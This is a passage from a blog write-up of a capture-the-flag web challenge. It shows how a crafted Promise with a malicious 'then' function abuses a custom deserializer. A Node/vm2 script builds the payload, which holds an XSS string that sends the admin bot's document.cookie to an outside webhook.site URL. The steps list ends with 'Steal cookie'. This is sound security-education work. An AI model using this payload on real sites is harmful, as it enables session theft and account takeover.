+      <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Function"</span><span class="token punctuation">,</span>
+      <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"globalThis.orders.push(JSON.parse('"</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"'));arguments[0]();"</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">]</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>arguments[0]</code> is the <code>resolve</code> function, we need to call it otherwise the program is hanged.</p>
+<p>As I mentioned earlier, if we can find a way to run a function, we can push our payload to <code>orders</code>.</p>
+<h2><span id="exploitation">Exploitation</span></h2><p>To sum up, we can get the flag by the following steps:</p>
+<ol>
+<li>Craft a serialized object with a malicious <code>then</code> function in the <code>orderId</code></li>
+<li>Manipulate <code>globalThis.orders</code> to insert our data with XSS payload</li>
+<li>The admin bot load our payload and trigger XSS</li>
+<li>Steal cookie</li>
+</ol>
+<p>Below is what I use to test and generate the payload:</p>
+<p>(BTW, we don’t need to insert a new record actually, just modify <code>orders[0]</code> to our xss payload. It’s easier and also works)</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token constant">VM</span><span class="token punctuation">,</span> VMScript<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VMScript</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./myshoplib.mjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'export '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+sendOrder(cart, orders)
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> orders <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  
+  <span class="token keyword">let</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'cart'</span><span class="token punctuation">,</span>
+      <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'pickledShoppingCart'</span><span class="token punctuation">,</span>
+      <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'items'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'pickledObject'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+            <span class="token punctuation">&#123;</span>
+              <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'&lt;img src=x onerror="location=`https://webhook.site/d8dc1452-8e82-408d-9dcf-8ad713754f36/?q=$&#123;encodeURIComponent(document.cookie)&#125;`">'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+              <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'pickledItem'</span><span class="token punctuation">,</span>
+              <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+                <span class="token punctuation">&#123;</span>
+                  <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'price'</span><span class="token punctuation">,</span>
+                  <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'Number'</span><span class="token punctuation">,</span>
+                  <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token number">10</span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                <span class="token punctuation">&#123;</span>
+                  <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'quantity'</span><span class="token punctuation">,</span>
+                  <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'String'</span><span class="token punctuation">,</span>
+                  <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token string">'1'</span>
+                <span class="token punctuation">&#125;</span>
+              <span class="token punctuation">]</span>
+            <span class="token punctuation">&#125;</span>
+          <span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'address'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'pickledAddress'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+            <span class="token punctuation">&#123;</span>
+              <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'street'</span><span class="token punctuation">,</span>
+              <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'String'</span><span class="token punctuation">,</span>
+              <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token string">''</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token punctuation">&#123;</span>
+              <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'number'</span><span class="token punctuation">,</span>
+              <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'Number'</span><span class="token punctuation">,</span>
+              <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token number">0</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token punctuation">&#123;</span>
+              <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'zip'</span><span class="token punctuation">,</span>
+              <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'Number'</span><span class="token punctuation">,</span>
+              <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token number">0</span>
+            <span class="token punctuation">&#125;</span>
+          <span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'shoppingCartId'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'String'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token number">800600798186</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'driver'</span><span class="token punctuation">,</span>
+      <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'pickledDriver'</span><span class="token punctuation">,</span>
+      <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'username'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'String'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token string">'johnnywalker'</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'orders'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'pickledArray'</span><span class="token punctuation">,</span>
+          <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token string-property property">'key'</span><span class="token operator">:</span> <span class="token string">'orderId'</span><span class="token punctuation">,</span>
+      <span class="token string-property property">'type'</span><span class="token operator">:</span> <span class="token string">'String'</span><span class="token punctuation">,</span>
+      <span class="token string-property property">'value'</span><span class="token operator">:</span> <span class="token string">'PEW'</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'\\"'</span><span class="token punctuation">)</span>
+
+  
+  <span class="token keyword">let</span> cart <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>
+    <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledShoppingCart"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"items"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledObject"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Tomato"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Pickle"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Pineapple"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">44</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"address"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledAddress"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"street"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"number"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"zip"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"shoppingCartId"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledPromise"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"then"</span><span class="token punctuation">,</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Function"</span><span class="token punctuation">,</span><span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"globalThis.orders.push(JSON.parse('"</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"'));arguments[0]();"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>
+  <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+  <span class="token keyword">let</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>orders<span class="token punctuation">,</span> cart<span class="token punctuation">,</span> console<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token keyword">await</span> vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'orders'</span><span class="token punctuation">)</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>orders<span class="token punctuation">)</span>
+
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>cart<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">&#125;</span>
+<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="conclusion">Conclusion</span></h2><p>This challenge shows us how a simple deserialization function can be abused by crafting a <code>Promise</code> with a malicious <code>then</code> function.</p>
+<p>You can return anything in an <code>async</code> function, but if you return a <code>Promise</code>, it will be resolved first as per the <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function#:~:text=async%20function%20is-,implicitly%20wrapped,-in%20Promise.resolve">MDN</a> documentation.</p>
+<p>Thanks Pew for solving the second part and other team members for the great teamwork.</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2022/08/01/en/uiuctf-2022-writeup/">UIUCTF 2022 Notes</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2022/07/09/en/google-ctf-2022-writeup/">GoogleCTF 2022 Notes</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2022/07/11/googlectf-2022-horkos-writeup/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
